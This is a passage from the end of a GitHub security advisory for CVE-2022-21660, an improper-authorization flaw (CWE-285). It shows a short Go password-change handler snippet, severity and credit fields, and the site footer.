	if err, _ := userService.ChangePassword(u, user.NewPassword); err != nil {
		global.GVA_LOG.Error("修改失败!", zap.Error(err))
		response.FailWithMessage("修改失败，原密码与当前账户不符", c)
	} else {
		response.OkWithMessage("修改成功", c)
	}
}
```

### Severity

High

### CVE ID

CVE-2022-21660

### Weaknesses

[CWE-285](/advisories?query=cwe%3A285)

### Credits

* [![@UzJu](https://avatars.githubusercontent.com/u/50813806?s=40&v=4)](/UzJu)
  [UzJu](/UzJu)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


